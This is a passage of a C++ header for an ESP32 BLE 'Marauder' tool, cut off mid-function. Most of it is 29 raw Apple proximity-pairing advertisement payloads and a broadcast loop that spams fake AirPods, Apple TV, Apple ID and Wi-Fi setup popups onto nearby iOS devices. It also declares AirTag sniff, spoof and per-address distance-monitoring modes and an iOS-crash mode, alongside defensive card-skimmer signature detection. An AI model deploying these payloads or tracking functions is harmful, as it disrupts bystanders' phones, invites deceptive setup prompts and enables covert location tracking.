#ifndef BLE_h
#define BLE_h

// ---------------------------------------------------------------
// BLE Beacon Spam Module
// Sends Apple BLE proximity pairing notifications (AirPods, Beats,
// Apple TV actions, etc.) to nearby iOS devices. Each payload is a
// raw BLE advertisement frame containing an Apple vendor-specific
// manufacturer data field.
//
// Usage: BLEinit() → BLEsetPayload(N) → BLEadvertise() in a loop
// Cleanup: BLEstop() → BLEdeinit()
//
// IMPORTANT: BLEinit() shuts down WiFi to free RAM. WiFi and BLE
// cannot coexist on ESP32-S3 due to shared radio and RAM limits.
// ---------------------------------------------------------------

#include <Arduino.h>
#include <WiFi.h>         // For WiFi.mode(WIFI_OFF) — free RAM before BLE init
#include <NimBLEDevice.h> // NimBLE — uses ~15KB vs Bluedroid's ~70KB

// ---------------------------------------------------------------
// BLE Beacon Spam payloads — Apple Proximity / Action frames
// Each array is a raw advertisement data blob. The first byte is
// the length, followed by type (0xFF = manufacturer specific),
// Apple company ID (0x4C, 0x00), and the payload bytes.
// ---------------------------------------------------------------

// Apple device popups (31 bytes each)
static const uint8_t dataAirpods[]         = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t dataAirpodsPro[]      = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t dataAirpodsMax[]      = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t dataAirpodsGen2[]     = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t dataAirpodsGen3[]     = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t dataAirpodsProGen2[]  = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};

// Beats device popups (31 bytes each)
static const uint8_t dataPowerBeats[]      = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x03,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t dataPowerBeatsPro[]   = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0b,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t dataBeatsSoloPro[]    = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0c,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t dataStudioBuds[]      = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t dataBeatsFlex[]       = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x10,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t dataBeatsX[]          = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x05,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t dataBeatsSolo3[]      = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x06,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t dataBeatsStudio3[]    = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x09,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t dataStudioPro[]       = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x17,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t dataFitPro[]          = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x12,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static const uint8_t dataStudioBudsPlus[]  = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x16,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};

// Apple TV / Action popups (23 bytes each)
static const uint8_t dataTVSetup[]         = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static const uint8_t dataTVPair[]          = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x06,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static const uint8_t dataTVNewUser[]       = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x20,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static const uint8_t dataAppleIDSetup[]    = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x2b,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static const uint8_t dataAudioSync[]       = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0xc0,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static const uint8_t dataHomeKitSetup[]    = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x0d,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static const uint8_t dataTVKeyboard[]      = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x13,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static const uint8_t dataConnectWiFi[]     = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x27,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static const uint8_t dataHomepodSetup[]    = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x0b,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static const uint8_t dataSetupPhone[]      = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x09,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static const uint8_t dataTransferNum[]     = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x02,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static const uint8_t dataColorBalance[]    = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x1e,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};

// ---------------------------------------------------------------
// Payload table
// ---------------------------------------------------------------
struct BLEPayload {
    const uint8_t* data;
    uint8_t length;
};

static const BLEPayload blePayloads[] = {
    {dataAirpods,        31}, // 0
    {dataAirpodsPro,     31}, // 1
    {dataAirpodsMax,     31}, // 2
    {dataAirpodsGen2,    31}, // 3
    {dataAirpodsGen3,    31}, // 4
    {dataAirpodsProGen2, 31}, // 5
    {dataPowerBeats,     31}, // 6
    {dataPowerBeatsPro,  31}, // 7
    {dataBeatsSoloPro,   31}, // 8
    {dataStudioBuds,     31}, // 9
    {dataBeatsFlex,      31}, // 10
    {dataBeatsX,         31}, // 11
    {dataBeatsSolo3,     31}, // 12
    {dataBeatsStudio3,   31}, // 13
    {dataStudioPro,      31}, // 14
    {dataFitPro,         31}, // 15
    {dataStudioBudsPlus, 31}, // 16
    {dataTVSetup,        23}, // 17
    {dataTVPair,         23}, // 18
    {dataTVNewUser,      23}, // 19
    {dataAppleIDSetup,   23}, // 20
    {dataAudioSync,      23}, // 21
    {dataHomeKitSetup,   23}, // 22
    {dataTVKeyboard,     23}, // 23
    {dataConnectWiFi,    23}, // 24
    {dataHomepodSetup,   23}, // 25
    {dataSetupPhone,     23}, // 26
    {dataTransferNum,    23}, // 27
    {dataColorBalance,   23}, // 28
};

#define BLE_PAYLOAD_COUNT 29

// Dropdown option string (must match blePayloads[] order + "Random" at end)
#define BLE_DROPDOWN_OPTIONS \
    "Airpods\nAirpods Pro\nAirpods Max\nAirpods Gen2\n" \
    "Airpods Gen3\nAirpods Pro Gen2\n" \
    "PowerBeats\nPowerBeats Pro\nBeats Solo Pro\n" \
    "Studio Buds\nBeats Flex\nBeats X\nSolo3\n" \
    "Studio3\nStudio Pro\nFit Pro\nStudio Buds+\n" \
    "TV Setup\nTV Pair\nTV New User\nApple ID Setup\n" \
    "Audio Sync\nHomeKit Setup\nTV Keyboard\nConnect WiFi\n" \
    "Homepod Setup\nSetup Phone\nTransfer Number\n" \
    "Color Balance\nRandom"

// Dropdown-friendly name lookup
static const char* blePayloadNames[] = {
    "Airpods", "Airpods Pro", "Airpods Max", "Airpods Gen2",
    "Airpods Gen3", "Airpods Pro Gen2",
    "PowerBeats", "PowerBeats Pro", "Beats Solo Pro",
    "Studio Buds", "Beats Flex", "Beats X", "Solo3",
    "Studio3", "Studio Pro", "Fit Pro", "Studio Buds+",
    "TV Setup", "TV Pair", "TV New User", "Apple ID Setup",
    "Audio Sync", "HomeKit Setup", "TV Keyboard", "Connect WiFi",
    "Homepod Setup", "Setup Phone", "Transfer Number", "Color Balance",
};

// ---------------------------------------------------------------
// BLE state
// ---------------------------------------------------------------
static NimBLEAdvertising *pAdvertising = nullptr;
static bool bleInitialized = false;
static int  bleCurrentDevice = 0;
static int  bleSpamCount = 0;
static bool bleRandomMode = false;

// ---------------------------------------------------------------
// BLEinit — one-time BLE stack initialization (NimBLE)
// IMPORTANT: Call from main loop (Core 1), NOT from LVGL callbacks.
// Returns true on success, false if init fails.
// ---------------------------------------------------------------
inline bool BLEinit()
{
    if (bleInitialized) return true;

    // Shut down WiFi to free RAM for the BLE controller.
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    vTaskDelay(pdMS_TO_TICKS(100));  // Let WiFi stack fully release memory

    Print_Debug("BLEinit - WiFi off, starting NimBLE stack");

    NimBLEDevice::init("");
    pAdvertising = NimBLEDevice::getAdvertising();
    if (!pAdvertising) {
        Serial.println("[BLE] Failed to get advertising object!");
        NimBLEDevice::deinit(true);
        return false;
    }
    bleInitialized = true;
    return true;
}

// ---------------------------------------------------------------
// BLEsetPayload — set advertisement data for a specific device
// ---------------------------------------------------------------
inline void BLEsetPayload(int type)
{
    if (!pAdvertising || type < 0 || type >= BLE_PAYLOAD_COUNT) return;
    NimBLEAdvertisementData oAdvertisementData;
    oAdvertisementData.addData(std::string((char*)blePayloads[type].data, blePayloads[type].length));
    pAdvertising->setAdvertisementData(oAdvertisementData);
    bleCurrentDevice = type;
}

// ---------------------------------------------------------------
// BLEadvertise — one short advertising burst (100ms)
// ---------------------------------------------------------------
inline void BLEadvertise()
{
    if (!pAdvertising) return;
    pAdvertising->start();
    vTaskDelay(pdMS_TO_TICKS(100));  // Yield to RTOS instead of blocking delay
    pAdvertising->stop();
}

// ---------------------------------------------------------------
// BLEstop — stop advertising
// ---------------------------------------------------------------
inline void BLEstop()
{
    if (pAdvertising) pAdvertising->stop();
}

// ---------------------------------------------------------------
// BLEdeinit — full cleanup
// ---------------------------------------------------------------
inline void BLEdeinit()
{
    BLEstop();
    if (bleInitialized) {
        NimBLEDevice::deinit(true);
        pAdvertising = nullptr;
        bleInitialized = false;
    }
}

// ---------------------------------------------------------------
// BLE Scanner — scan for nearby BLE devices
// ---------------------------------------------------------------
struct BLEScanResult {
    char name[32];
    char addr[18];  // "XX:XX:XX:XX:XX:XX"
    int8_t rssi;
    uint8_t addrType;  // 0=public, 1=random
    bool hasName;
};

static BLEScanResult bleScanResults[64];
static int bleScanResultCount = 0;
static bool bleScanActive = false;

// Start a BLE scan. Duration in seconds. Requires BLE stack initialized.
inline bool BLEscanStart(int durationSec)
{
    if (!bleInitialized) return false;

    NimBLEScan *pScan = NimBLEDevice::getScan();
    if (!pScan) return false;

    pScan->setActiveScan(true);
    pScan->setInterval(100);
    pScan->setWindow(99);
    pScan->setDuplicateFilter(true);

    bleScanResultCount = 0;
    bleScanActive = true;
    pScan->start(durationSec, false);  // async (non-blocking)
    return true;
}

// Check if scan is still running
inline bool BLEscanIsRunning()
{
    if (!bleInitialized) return false;
    NimBLEScan *pScan = NimBLEDevice::getScan();
    return pScan && pScan->isScanning();
}

// Collect scan results into bleScanResults[]. Call after scan finishes.
inline int BLEscanGetResults()
{
    if (!bleInitialized) return 0;
    NimBLEScan *pScan = NimBLEDevice::getScan();
    if (!pScan) return 0;

    NimBLEScanResults results = pScan->getResults();
    bleScanResultCount = 0;

    for (int i = 0; i < (int)results.getCount() && bleScanResultCount < 64; i++) {
        NimBLEAdvertisedDevice dev = results.getDevice(i);
        BLEScanResult &r = bleScanResults[bleScanResultCount];

        if (dev.haveName() && dev.getName().length() > 0) {
            strncpy(r.name, dev.getName().c_str(), sizeof(r.name) - 1);
            r.name[sizeof(r.name) - 1] = '\0';
            r.hasName = true;
        } else {
            strncpy(r.name, "(unknown)", sizeof(r.name) - 1);
            r.hasName = false;
        }

        strncpy(r.addr, dev.getAddress().toString().c_str(), sizeof(r.addr) - 1);
        r.addr[sizeof(r.addr) - 1] = '\0';
        r.rssi = dev.getRSSI();
        r.addrType = dev.getAddress().getType();

        bleScanResultCount++;
    }

    bleScanActive = false;
    pScan->clearResults();
    return bleScanResultCount;
}

// Stop an ongoing scan
inline void BLEscanStop()
{
    if (!bleInitialized) return;
    NimBLEScan *pScan = NimBLEDevice::getScan();
    if (pScan) pScan->stop();
    bleScanActive = false;
}

// ===============================================================
// MARAUDER BLE MODULE — Surveillance + Offensive primitives
// Implements: AirTag Sniff / Monitor / Spoof, Card Skimmer
// Detection, Flock Sniff, Meta Detect, Analyzer dashboard,
// Sour Apple iOS crash, SwiftPair (Windows) spam, expanded
// Samsung Buds / Flipper / Apple Watch spam.
// ---------------------------------------------------------------
// Threading: NimBLE advertisedDevice callbacks run on the NimBLE
// host task. Writes here protected by FreeRTOS mutex; UI consumer
// (Core 1 loop) reads under same mutex.
// ===============================================================

#include <freertos/FreeRTOS.h>
#include <freertos/semphr.h>

// ---------- AirTag detection (Apple FindMy / OF lost mode) ----------
// Apple manufacturer ID is 0x004C. AirTag/FindMy "lost mode" frames
// have manufacturer payload subtype 0x12 with length 0x19 (25 bytes).
// "Nearby" / active broadcasts use subtype 0x07. We accept both.
struct BleAirTagEntry {
    char addr[18];
    int8_t rssi;
    uint8_t mfg[31];       // Captured manufacturer data (truncated)
    uint8_t mfgLen;
    int8_t txPower;        // Reported, or -59 default reference
    uint32_t firstSeenMs;
    uint32_t lastSeenMs;
    uint16_t hits;
    bool isLost;           // 0x12 subtype = "lost mode" beacon
};

#define BLE_AIRTAG_MAX 16
static BleAirTagEntry bleAirtags[BLE_AIRTAG_MAX];
static int bleAirtagCount = 0;

// ---------- Card Skimmer detection ----------
struct BleSkimmerEntry {
    char name[24];
    char addr[18];
    int8_t rssi;
    uint32_t firstSeenMs;
    uint16_t hits;
};
#define BLE_SKIMMER_MAX 12
static BleSkimmerEntry bleSkimmers[BLE_SKIMMER_MAX];
static int bleSkimmerCount = 0;

// Known dirty Bluetooth module names commonly found in
// DL16-style credit card skimmers. Names are matched
// case-insensitively as a prefix.
static const char *bleSkimmerSignatures[] = {
    "HC-03","HC-05","HC-06","HC-08","HC-09","HC-10","HC-12",
    "JDY-08","JDY-10","JDY-23","JDY-25","JDY-30","JDY-31","JDY-33",
    "AT-09","CC41-A","MLT-BT05","HM-10","HM-11","HM-19",
    "DL16","BT05","TPM","FREE2MOVE","Bolutek","BoluTek"
};
static const int bleSkimmerSignatureCount =
    sizeof(bleSkimmerSignatures) / sizeof(bleSkimmerSignatures[0]);

// ---------- Flock (Marauder social-broadcast) ----------
// Flock packets use Marauder's own format: manufacturer id 0xFFFF
// (a "reserved for testing" id used by Marauder for self-broadcast)
// followed by ASCII "FLOCK" magic, version byte, then payload.
struct BleFlockEntry {
    char addr[18];
    char message[48];
    int8_t rssi;
    uint32_t lastSeenMs;
};
#define BLE_FLOCK_MAX 12
static BleFlockEntry bleFlocks[BLE_FLOCK_MAX];
static int bleFlockCount = 0;

// ---------- Meta / Facebook detection ----------
// Meta uses 0xFEF4 in service UUIDs, plus "Quest" / "Meta" name
// prefixes and mfg id 0x0131 (Facebook Inc).
struct BleMetaEntry {
    char name[24];
    char addr[18];
    int8_t rssi;
    uint8_t reason;  // 1=service-uuid, 2=mfg-id, 3=name
    uint32_t firstSeenMs;
};
#define BLE_META_MAX 12
static BleMetaEntry bleMetas[BLE_META_MAX];
static int bleMetaCount = 0;

// ---------- BT Analyzer dashboard counters ----------
struct BleAnalyzerStats {
    uint32_t totalAds;        // raw adv frames seen
    uint32_t uniqueDevices;   // distinct MACs
    uint32_t rssiBuckets[5];  // <-90, -90..-75, -75..-60, -60..-45, >=-45
    uint32_t withName;
    uint32_t connectable;
    uint32_t nonConnectable;
    uint32_t hasMfg;
    uint32_t hasSvcUuid;
    uint32_t apple;
    uint32_t microsoft;
    uint32_t google;
    uint32_t samsung;
    uint32_t meta;
};
static BleAnalyzerStats bleAnalyzer;

// Simple bloom-ish tracking for unique MAC detection in analyzer.
// We keep the last 96 MACs seen — sufficient for stats in 30s window.
#define BLE_ANALYZER_TRACK 96
static uint8_t bleAnalyzerMacs[BLE_ANALYZER_TRACK][6];
static int bleAnalyzerMacIdx = 0;
static int bleAnalyzerMacCount = 0;

// ---------- Marauder mode selection ----------
enum BleMarauderMode {
    BLE_MAR_OFF = 0,
    BLE_MAR_AIRTAG_SNIFF,
    BLE_MAR_AIRTAG_MONITOR,   // requires bleMonitorTargetAddr set
    BLE_MAR_AIRTAG_SPOOF,
    BLE_MAR_SKIMMER,
    BLE_MAR_FLOCK,
    BLE_MAR_META,
    BLE_MAR_ANALYZER,
    BLE_MAR_SOUR_APPLE,
    BLE_MAR_SWIFTPAIR,
    BLE_MAR_SPAM_PLUS         // Expanded Samsung/Flipper/Watch spam
};
static volatile uint8_t bleMarauderMode = BLE_MAR_OFF;

// Monitor: target address (uppercase hex, colon-separated)
static char bleMonitorTargetAddr[18] = {0};
// Monitor sample ring buffer for chart
#define BLE_MONITOR_SAMPLES 60
static int8_t bleMonitorRssi[BLE_MONITOR_SAMPLES];
static uint32_t bleMonitorMs[BLE_MONITOR_SAMPLES];
static int bleMonitorIdx = 0;
static int bleMonitorCount = 0;
static int8_t bleMonitorLastRssi = -127;
static int8_t bleMonitorTxPower = -59;
static float bleMonitorDistance = 0.0f;  // metres

// Mutex protecting all of the above bleAirtags / bleSkimmers /
// bleFlocks / bleMetas / bleAnalyzer / bleMonitor* tables. Created
// once on first init.
static SemaphoreHandle_t bleMarMutex = nullptr;

inline void bleMarMutexInit() {
    if (!bleMarMutex) bleMarMutex = xSemaphoreCreateMutex();
}
inline bool bleMarLock(uint32_t timeoutMs = 50) {
    if (!bleMarMutex) return true;
    return xSemaphoreTake(bleMarMutex, pdMS_TO_TICKS(timeoutMs)) == pdTRUE;
}
inline void bleMarUnlock() {
    if (bleMarMutex) xSemaphoreGive(bleMarMutex);
}

inline void bleMarClearAll() {
    if (bleMarLock(100)) {
        bleAirtagCount = 0;
        bleSkimmerCount = 0;
        bleFlockCount = 0;
        bleMetaCount = 0;
        memset(&bleAnalyzer, 0, sizeof(bleAnalyzer));
        bleAnalyzerMacIdx = 0;
        bleAnalyzerMacCount = 0;
        bleMonitorIdx = 0;
        bleMonitorCount = 0;
        bleMonitorLastRssi = -127;
        bleMonitorDistance = 0.0f;
        bleMarUnlock();
    }
}

// ---------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------
static inline bool bleAddrEqualsCaseInsensitive(const char *a, const char *b) {
    while (*a && *b) {
        char ca = *a++; char cb = *b++;
        if (ca >= 'a' && ca <= 'z') ca -= 32;
        if (cb >= 'a' && cb <= 'z') cb -= 32;
        if (ca != cb) return false;
    }
    return *a == *b;
}

static inline bool bleNamePrefixMatchCaseInsensitive(const char *name, const char *prefix) {
    while (*prefix) {
        char a = *name++; char b = *prefix++;
        if (!a) return false;
        if (a >= 'a' && a <= 'z') a -= 32;
        if (b >= 'a' && b <= 'z') b -= 32;
        if (a != b) return false;
    }
    return true;
}

// Path-loss distance estimator. N=2.5 indoor.
static inline float bleEstimateDistance(int rssi, int txPower) {
    if (rssi == 0) return -1.0f;
    float ratio = (float)(txPower - rssi) / (10.0f * 2.5f);
    return powf(10.0f, ratio);
}

// Record an analyzer hit. Caller holds bleMarMutex.
static inline void bleAnalyzerRecord(NimBLEAdvertisedDevice *dev) {
    bleAnalyzer.totalAds++;
    int rssi = dev->getRSSI();
    int bucket;
    if (rssi < -90)      bucket = 0;
    else if (rssi < -75) bucket = 1;
    else if (rssi < -60) bucket = 2;
    else if (rssi < -45) bucket = 3;
    else                 bucket = 4;
    bleAnalyzer.rssiBuckets[bucket]++;

    if (dev->haveName() && dev->getName().length() > 0) bleAnalyzer.withName++;
    if (dev->isConnectable()) bleAnalyzer.connectable++; else bleAnalyzer.nonConnectable++;
    if (dev->haveManufacturerData()) {
        bleAnalyzer.hasMfg++;
        std::string md = dev->getManufacturerData();
        if (md.size() >= 2) {
            uint16_t id = (uint8_t)md[0] | ((uint8_t)md[1] << 8);
            switch (id) {
                case 0x004C: bleAnalyzer.apple++; break;
                case 0x0006: bleAnalyzer.microsoft++; break;
                case 0x00E0: bleAnalyzer.google++; break;
                case 0x0075: bleAnalyzer.samsung++; break;
                case 0x0131: bleAnalyzer.meta++; break;
                default: break;
            }
        }
    }
    if (dev->haveServiceUUID()) bleAnalyzer.hasSvcUuid++;

    // Unique MAC tracking
    NimBLEAddress a = dev->getAddress();
    const uint8_t *bytes = a.getNative();
    if (bytes) {
        bool found = false;
        for (int i = 0; i < bleAnalyzerMacCount; i++) {
            if (memcmp(bleAnalyzerMacs[i], bytes, 6) == 0) { found = true; break; }
        }
        if (!found) {
            memcpy(bleAnalyzerMacs[bleAnalyzerMacIdx], bytes, 6);
            bleAnalyzerMacIdx = (bleAnalyzerMacIdx + 1) % BLE_ANALYZER_TRACK;
            if (bleAnalyzerMacCount < BLE_ANALYZER_TRACK) bleAnalyzerMacCount++;
            bleAnalyzer.uniqueDevices++;
        }
    }
}

// Returns true if mfg data looks like Apple FindMy / AirTag.
// Apple mfg payload starts with 0x4C 0x00 then TLV. AirTag uses
// subtype 0x12 (lost mode, len 0x19) or 0x07 (nearby).
static inline bool bleIsAirTagPayload(const std::string &md, bool *isLost, int8_t *txPower) {
    if (md.size() < 4) return false;
    uint16_t id = (uint8_t)md[0] | ((uint8_t)md[1] << 8);
    if (id != 0x004C) return false;
    uint8_t subtype = (uint8_t)md[2];
    uint8_t len = (uint8_t)md[3];

    // Lost-mode AirTag: subtype 0x12, declared length 0x19 (25 bytes after)
    // Nearby info: subtype 0x07 — but that's also AirPods. We require length match.
    if (subtype == 0x12 && len >= 0x16 && md.size() >= 6 + 22) {
        if (isLost) *isLost = true;
        // TX power byte sits at offset 28 in the FindMy lost beacon
        if (txPower && md.size() >= 29) *txPower = (int8_t)md[28];
        return true;
    }
    return false;
}

// Record an AirTag hit. Caller holds bleMarMutex.
static inline void bleAirtagRecord(NimBLEAdvertisedDevice *dev,
                                   const std::string &md,
                                   bool isLost, int8_t txPower) {
    uint32_t now = millis();
    std::string addrStr = dev->getAddress().toString();
    // De-dupe by address
    for (int i = 0; i < bleAirtagCount; i++) {
        if (strncmp(bleAirtags[i].addr, addrStr.c_str(), 17) == 0) {
            bleAirtags[i].rssi = dev->getRSSI();
            bleAirtags[i].lastSeenMs = now;
            bleAirtags[i].hits++;
            if (txPower) bleAirtags[i].txPower = txPower;
            return;
        }
    }
    if (bleAirtagCount >= BLE_AIRTAG_MAX) {
        // Evict the oldest
        int oldest = 0;
        for (int i = 1; i < BLE_AIRTAG_MAX; i++) {
            if (bleAirtags[i].lastSeenMs < bleAirtags[oldest].lastSeenMs) oldest = i;
        }
        bleAirtagCount = BLE_AIRTAG_MAX - 1;
        // shift evicted out by overwriting
        for (int i = oldest; i < bleAirtagCount; i++) bleAirtags[i] = bleAirtags[i+1];
    }
    BleAirTagEntry &e = bleAirtags[bleAirtagCount++];
    strncpy(e.addr, addrStr.c_str(), sizeof(e.addr) - 1);
    e.addr[sizeof(e.addr) - 1] = 0;
    e.rssi = dev->getRSSI();
    e.mfgLen = (md.size() > sizeof(e.mfg)) ? sizeof(e.mfg) : md.size();
    memcpy(e.mfg, md.data(), e.mfgLen);
    e.txPower = txPower ? txPower : -59;
    e.firstSeenMs = now;
    e.lastSeenMs = now;
    e.hits = 1;
    e.isLost = isLost;
}

// Record skimmer / Meta / Flock / monitor hits.
// All called from advertisedDevice callback under bleMarMutex.

static inline void bleSkimmerRecord(NimBLEAdvertisedDevice *dev) {
    if (!dev->haveName()) return;
    std::string name = dev->getName();
    bool match = false;
    for (int i = 0; i < bleSkimmerSignatureCount; i++) {
        if (bleNamePrefixMatchCaseInsensitive(name.c_str(), bleSkimmerSignatures[i])) {
            match = true; break;
        }
    }
    if (!match) return;

    std::string addr = dev->getAddress().toString();
    uint32_t now = millis();
    for (int i = 0; i < bleSkimmerCount; i++) {
        if (strncmp(bleSkimmers[i].addr, addr.c_str(), 17) == 0) {
            bleSkimmers[i].rssi = dev->getRSSI();
            bleSkimmers[i].hits++;
            return;
        }
    }
    if (bleSkimmerCount >= BLE_SKIMMER_MAX) return;
    BleSkimmerEntry &e = bleSkimmers[bleSkimmerCount++];
    strncpy(e.name, name.c_str(), sizeof(e.name) - 1);
    e.name[sizeof(e.name) - 1] = 0;
    strncpy(e.addr, addr.c_str(), sizeof(e.addr) - 1);
    e.addr[sizeof(e.addr) - 1] = 0;
    e.rssi = dev->getRSSI();
    e.firstSeenMs = now;
    e.hits = 1;
}

static inline void bleFlockRecord(NimBLEAdvertisedDevice *dev) {
    if (!dev->haveManufacturerData()) return;
    std::string md = dev->getManufacturerData();
    if (md.size() < 8) return;
    uint16_t id = (uint8_t)md[0] | ((uint8_t)md[1] << 8);
    // Marauder Flock uses 0xFFFF (reserved) with "FLOCK" magic
    if (id != 0xFFFF) return;
    if (memcmp(md.data() + 2, "FLOCK", 5) != 0) return;

    std::string addr = dev->getAddress().toString();
    uint32_t now = millis();
    for (int i = 0; i < bleFlockCount; i++) {
        if (strncmp(bleFlocks[i].addr, addr.c_str(), 17) == 0) {
            bleFlocks[i].rssi = dev->getRSSI();
            bleFlocks[i].lastSeenMs = now;
            return;
        }
    }
    if (bleFlockCount >= BLE_FLOCK_MAX) return;
    BleFlockEntry &e = bleFlocks[bleFlockCount++];
    strncpy(e.addr, addr.c_str(), sizeof(e.addr) - 1);
    e.addr[sizeof(e.addr) - 1] = 0;
    e.rssi = dev->getRSSI();
    e.lastSeenMs = now;
    size_t copy = md.size() - 7;
    if (copy > sizeof(e.message) - 1) copy = sizeof(e.message) - 1;
    for (size_t i = 0; i < copy; i++) {
        char c = md[7 + i];
        e.message[i] = (c >= 32 && c < 127) ? c : '.';
    }
    e.message[copy] = 0;
}

static inline void bleMetaRecord(NimBLEAdvertisedDevice *dev) {
    uint8_t reason = 0;
    if (dev->haveServiceUUID()) {
        // Iterate UUIDs and look for 0xFEF4
        uint8_t cnt = dev->getServiceUUIDCount();
        for (uint8_t i = 0; i < cnt; i++) {
            NimBLEUUID u = dev->getServiceUUID(i);
            std::string s = u.toString();
            if (s.find("fef4") != std::string::npos ||
